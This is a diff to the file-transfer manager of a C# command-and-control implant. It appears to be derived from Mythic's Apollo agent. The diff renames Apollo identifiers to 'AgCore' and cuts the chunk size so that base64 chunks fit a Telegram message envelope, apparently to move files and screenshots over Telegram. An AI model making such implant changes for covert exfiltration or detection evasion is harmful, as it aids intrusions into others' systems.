@@ -1,17 +1,17 @@
-﻿using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+﻿using AgInterop.Interfaces;
+using AgInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.IO;
 using System.Linq;
 using System.Threading;
-using ApolloInterop.Classes.Cryptography;
+using AgInterop.Classes.Cryptography;
 
-namespace Apollo.Management.Files
+namespace AgCore.Management.Files
 {
     public sealed class FileManager : IFileManager
     {
-        private int _chunkSize = 512000;
+        private int _chunkSize = 1800;   // telegram: base64(1800)=2400 chars fits one 2800-char envelope
         private IAgent _agent;
         private IEncryptedFileStore _fileStore;
 
@@ -65,14 +65,14 @@ namespace Apollo.Management.Files
 
         public void ProcessResponse(MythicTaskStatus resp)
         {
-            if (_uploadMessageStore.TryGetValue(resp.ApolloTrackerUUID, out FileTransferTracker uploadTracker))
+            if (_uploadMessageStore.TryGetValue(resp.AgCoreTrackerUUID, out FileTransferTracker uploadTracker))
             {
                 if (resp.ChunkNumber > 0 || resp.StatusMessage == "error")
                 {
                     uploadTracker.AddMessage(resp);
                 }
             }
-            else if (_downloadMessageStore.TryGetValue(resp.ApolloTrackerUUID, out FileTransferTracker downloadTracker))
+            else if (_downloadMessageStore.TryGetValue(resp.AgCoreTrackerUUID, out FileTransferTracker downloadTracker))
             {
                 downloadTracker.AddMessage(resp);
             }
@@ -122,7 +122,7 @@ namespace Apollo.Management.Files
                         IsScreenshot = isScreenshot,
                         TaskID = taskID,
                     },
-                    ApolloTrackerUUID = uuid
+                    AgCoreTrackerUUID = uuid
                 });
 
                 while (tracker.GetNextMessage(ct, out MythicTaskStatus message))
@@ -172,7 +172,7 @@ namespace Apollo.Management.Files
                             ChunkData = Convert.ToBase64String(chunkData),
                             TaskID = taskID
                         },
-                        ApolloTrackerUUID = uuid
+                        AgCoreTrackerUUID = uuid
                     };
                     if (chunksSent == 0)
                     {
@@ -267,7 +267,7 @@ namespace Apollo.Management.Files
                     ChunkNumber = chunkNumber,
                     ChunkSize = _chunkSize
                 },
-                ApolloTrackerUUID = uuid
+                AgCoreTrackerUUID = uuid
             });
         }
 
